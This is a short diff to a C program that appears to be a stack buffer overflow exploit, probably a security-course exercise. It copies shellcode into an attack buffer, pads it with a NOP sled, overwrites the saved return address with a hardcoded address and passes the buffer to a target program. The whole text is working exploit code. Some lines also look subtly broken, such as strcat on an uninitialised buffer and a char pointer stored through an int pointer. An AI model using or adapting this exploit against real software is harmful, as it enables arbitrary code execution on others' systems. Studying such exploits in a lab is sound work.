@@ -19,11 +19,11 @@ main ( int argc, char * argv[] )
 	char attack_buffer[BUF_SIZE];
 
 	strcat(attack_buffer, shellcode);
-	memset(&attack_buffer[BUF_SIZE], 0x90, 120 - BUF_SIZE);
+	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
+		attack_buffer[i] = 0x90;
 
 	int *ret_address = (int*)&attack_buffer[BUF_TO_RET];
-	char* retaddr = (char*)0x2021fe10;
-	SET_VALUE(attack_buffer, 120, retaddr);
+	*ret_address = (char*)0x2021fe10;
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
